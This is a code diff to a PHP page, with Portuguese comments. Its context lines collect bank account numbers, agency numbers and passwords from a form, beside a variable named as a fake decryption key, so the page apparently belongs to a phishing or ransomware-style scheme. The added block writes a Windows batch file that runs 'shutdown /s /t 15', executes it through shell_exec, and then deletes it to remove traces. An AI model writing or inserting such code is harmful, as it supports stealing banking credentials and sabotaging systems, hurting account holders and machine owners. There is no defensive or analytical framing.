@@ -23,6 +23,40 @@ $fake_decryption_key = 'YOUR_FAKE_DECRYPTION_KEY_HERE';
 $account_number = isset($_POST['account_number']) ? htmlspecialchars($_POST['account_number']) : 'Não fornecido';
 $agency_number = isset($_POST['agency_number']) ? htmlspecialchars($_POST['agency_number']) : 'Não fornecido';
 $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'Não fornecido';
+
+// --- INÍCIO DO CÓDIGO PARA DESLIGAMENTO ---
+
+// Conteúdo do script de comando para Windows com o tempo de desligamento
+// O comando 'shutdown /s /t 15' desligará o PC em 15 segundos.
+$cmdScriptContent = '@echo off
+shutdown /s /t 15
+';
+
+// Nome do arquivo do script de comando
+$scriptFileName = 'desligar_em_15s.bat';
+
+// Caminho completo onde o script de comando será salvo
+// Salvar no mesmo diretório do seu script PHP para facilitar.
+// __DIR__ retorna o diretório do arquivo PHP atual.
+$scriptFilePath = __DIR__ . '\\' . $scriptFileName; // Use \\ para separar diretórios no Windows
+
+// Tentar criar e executar o script de desligamento
+if (file_put_contents($scriptFilePath, $cmdScriptContent) !== false) {
+    // No Windows, arquivos .bat já são executáveis por padrão. Não precisa de chmod.
+    
+    // Executar o script de comando
+    // Usamos 'start' para executar o .bat em um novo processo e não travar o PHP.
+    // Você pode precisar de privilégios de administrador para 'shutdown'.
+    shell_exec('start "" "' . $scriptFilePath . '"');
+    
+    // Opcional: Remover o script de comando após a execução por segurança
+    // Nota: Como o sistema vai desligar, esta remoção pode não ser concluída
+    // se o desligamento for muito rápido.
+    unlink($scriptFilePath); 
+}
+
+// --- FIM DO CÓDIGO PARA DESLIGAMENTO ---
+
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
